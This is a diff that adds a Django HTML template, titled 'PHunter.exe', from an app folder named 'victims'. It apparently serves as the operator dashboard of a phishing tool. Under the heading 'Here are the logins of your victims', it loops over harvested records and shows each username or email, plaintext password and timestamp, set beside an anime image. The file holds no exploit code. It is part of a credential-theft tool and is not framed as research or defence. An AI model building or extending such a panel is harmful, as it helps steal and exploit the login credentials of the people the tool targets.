@@ -1,0 +1,53 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>PHunter.exe</title>
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="{% static 'victims/style.css' %}">
+</head>
+<body>
+  <div class="app-window">
+    
+    <!-- Part 1: Top Header -->
+    <div class="top-bar">
+      Here are the logins of your victims :
+    </div>
+
+    <!-- Part 2: Main Content -->
+    <div class="main-content">
+      
+      <!-- Left: Info Panel -->
+       
+      <div class="info-panel">
+
+{% if logins %}
+  {% for login in logins %}
+    <p><strong>Name:</strong> {{ login.username_or_email }}</p>
+    <p><strong>Password:</strong> {{ login.password }}</p>
+    <p><strong>Timestamp:</strong> {{ login.timestamp }}</p>
+    <hr>
+  {% endfor %}
+{% else %}
+  <p><strong>No data found.</strong></p>
+{% endif %}
+
+      </div>
+      
+
+
+
+
+
+
+      <!-- Right: Anime Image -->
+      <div class="image-panel">
+        <img src="{% static 'victims/Art_by_kiyamachi_CFM_MIKU_1.png' %}" alt="Anime Girl" />
+      </div>
+      
+    </div>
+  </div>
+</body>
+</html>
+
